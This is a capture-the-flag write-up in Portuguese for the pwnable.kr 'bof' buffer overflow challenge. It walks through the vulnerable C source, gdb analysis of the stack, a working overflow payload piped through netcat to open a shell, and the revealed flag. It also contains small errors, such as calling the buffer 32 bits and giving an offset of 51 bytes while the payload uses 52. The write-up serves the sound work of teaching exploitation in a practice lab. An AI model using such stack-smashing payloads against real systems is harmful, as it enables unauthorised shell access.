# Duckware Team - bof (pwnable)
###### Solved by @Antonio-alexandre

> This CTF is about pwn, buffer overflow

## Desafio: bof (Pwn, Buffer Overflow)
#### Introdução

Neste desafio, precisaremos analisar e identificar vulnerabilidades em um código a fim de aplicar uma técnica chamada de `Buffer Overflow`, para assim conseguirmos identificar a

- [Página do desafio](http://pwnable.kr/play.php)

#### Análise Inicial

A princípio, nos deparamos com a seguinte descrição: 

> Vovó me disse que o buffer overflow é uma das vulnerabilidades de software mais comuns.
Isso é verdade?

Além dos seguintes links para download dos arquivos:

- [Link 1](http://pwnable.kr/bin/bof)
- [Link 2](http://pwnable.kr/bin/bof.c)

Além do seguinte códig para conectar ao servidor:

`nc pwnable.kr 9000` 

#### Solução

A princípio, nos deparamos com dois arquivos. Um código em C chamado `bof.c` e um executável apenas com o nome de `bof`. Juntamente com um código a ser inserido para conectar ao servidor. 

Ao tentarmos conectar ao servidor, nos deparamos com a seguinte mensagem:

[![Imagem6.png](https://i.postimg.cc/fL1hGjGL/Imagem6.png)](https://postimg.cc/jw69NNd0)

Como não temos como prosseguir, iremos ao código.

O código que nos foi concebido, é o seguinte:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
        char overflowme[32];
        printf("overflow me : ");
        gets(overflowme);       // smash me!
        if(key == 0xcafebabe){
                system("/bin/sh");
        }
        else{
                printf("Nah..\n");
        }
}
int main(int argc, char* argv[]){
        func(0xdeadbeef);
        return 0;
}
```

O objetivo desse desafio, é que o valor da variável `key` seja alterado para `0xcafebabe`. Isso permitirá que o sistema execute `/bin/sh`, permitindo assim o nosso acesso a um [shell](https://guialinux.com.br/o-que-e-um-shell/).

Ao analisar todo o código, chegamos a algumas conclusões:

- O código possui um buffer de 32 bits.
- A função gets() permite a entrada de uma informação do usuário, sem que haja verificação de tamanho.
- Assim que o valor da variável `key` é alterado para o desejado, ele executará um shell.

Porém, o código não nos permite digitar diretamente. Precisaremos então utilizar uma ferramenta externa, chamada de `gdb`.

Executaremos então o comando `gdb bof`, para executar o `gdb`.

[![Imagem7.png](https://i.postimg.cc/QCcvRLg4/Imagem7.png)](https://postimg.cc/xNTsz44M)

Dentro do terminal do gdb, iremos descompilar a `main`. Ao executar o comando, ele nos retorna a seguinte tabela:

[![Imagem8.png](https://i.postimg.cc/BvtkJPc1/Imagem8.png)](https://postimg.cc/67JY03P9)

Já ao descompilar a função `func`, nos deparamos com a seguinte tabela:

[![Imagem9.png](https://i.postimg.cc/4NZ0mSQG/Imagem9.png)](https://postimg.cc/V5Ggh4hZ)

Como podemos notar ao analisar, percebemos que a função `$0xdeadbeef` está sendo movida para o registrador %eax:

`0x00000693 <+9>:    movl   $0xdeadbeef,(%esp)`

Já a seguinte linha, mostra a comparação de `0xcafebabe` que precisamos.

`0x00000654 <+40>:    cmpl   $0xcafebabe,0x8(%ebp)`

Basta então, executar o código com um [breakpoint](https://programae.org.br/cursoprogramacao/glossario/o-que-e-breakpoint-em-programacao/) em `gets`:

[![Imagem10.png](https://i.postimg.cc/YSmRX6z8/Imagem10.png)](https://postimg.cc/jWty2J9J)

Podemos então printar o conteúdo de `$ebp+8` (da linha `cafebabe`)

[![Imagem11.png](https://i.postimg.cc/3N3ZJP5b/Imagem11.png)](https://postimg.cc/1nYFv7zp)

O endereço de key no meu caso é `0xffffcf50`. Nesse caso, basta encontrar onde o buffer começa, para saber a distância entre eles.

Se sobrescrevermos essa quantidade de bytes no buffer, terminando com `cafebabe` o valor de `deadbeef` será alterado e a flag revelada.

Como nós possuímos a informação de que `deadbeef` foi copiada para `eax`, podemos identificar uma [lea](https://iq.opengenus.org/x86-lea/) na seguinte linha:

`0x00000649 <+29>:    lea    -0x2c(%ebp),%eax`

Nesse caso então, precisamos checar `$ebp-0x2c`. Para isso, utilizaremos o seguinte comando:
```
(gdb) x/1s $ebp-0x2c
0xffffcf1c:     "booooooof"
```

Então, basta identificar a distância entre eles:

[![Imagem12.png](https://i.postimg.cc/W3vGXQ3b/Imagem12.png)](https://postimg.cc/2q0L59hP)

Percebemos então que há uma distância de 51 bytes. Feito isso, basta executar o seguinte comando no terminal:

```
(python -c "print '\x01'*52+'\xbe\xba\xfe\xca'";cat) | nc pwnable.kr 9000
cat flag
```

Assim então, temos acesso a `flag`:

>`daddy, I just pwned a buFFer :)`
 
